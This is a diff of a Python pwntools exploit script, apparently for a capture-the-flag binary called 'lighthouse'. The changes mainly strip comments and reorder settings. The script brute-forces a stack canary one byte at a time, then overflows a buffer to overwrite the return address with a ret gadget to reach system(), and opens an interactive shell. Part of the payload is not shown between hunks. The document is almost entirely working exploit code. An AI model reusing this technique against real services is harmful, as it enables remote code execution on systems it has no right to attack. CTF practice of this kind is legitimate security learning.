@@ -1,20 +1,17 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = ELF("./lighthouse", checksec=False)
+exe = ELF('./lighthouse', checksec=False)
 context.binary = exe
-context.arch   = 'amd64'
 context.os     = 'linux'
+context.arch   = 'amd64'
 
 HOSTNAME = 'HOSTNAME_PLACEHOLDER'
 PORT     = 0  # PORT_PLACEHOLDER
 
-# ── offsets ───────────────────────────────────────────────────────────────────
-OFFSET_TO_CANARY = 136   # buf[128] + 8 bytes padding
-OFFSET_TO_RIP    = 152   # OFFSET_TO_CANARY + canary (8) + saved RBP (8)
-
-# ── gadgets ───────────────────────────────────────────────────────────────────
-GADGET = 0x000000000040101a   # ret — 16-byte stack alignment for system()
+OFFSET_TO_CANARY = 136
+OFFSET_TO_RIP    = 152
+GADGET           = 0x000000000040101a
 
 def conn(interactive=False):
     level = 'info' if interactive else 'error'
@@ -37,7 +34,6 @@ def try_byte(known, bval):
         return False
 
 def main():
-    # ── leak phase ────────────────────────────────────────────────────────────
     known = b'\x00'
     for i in range(7):
         p = log.progress(f'Bruteforcing byte {i+1}')
@@ -53,7 +49,6 @@ def main():
     canary = u64(known)
     log.success(f'canary = {canary:#x}')
 
-    # ── exploit phase ─────────────────────────────────────────────────────────
     r = conn(interactive=True)
     r.recvuntil(b'> ')
     r.sendline(b'1')
@@ -68,6 +63,7 @@ def main():
     )
     r.send(payload)
     r.interactive()
+
 
 if __name__ == '__main__':
     main()
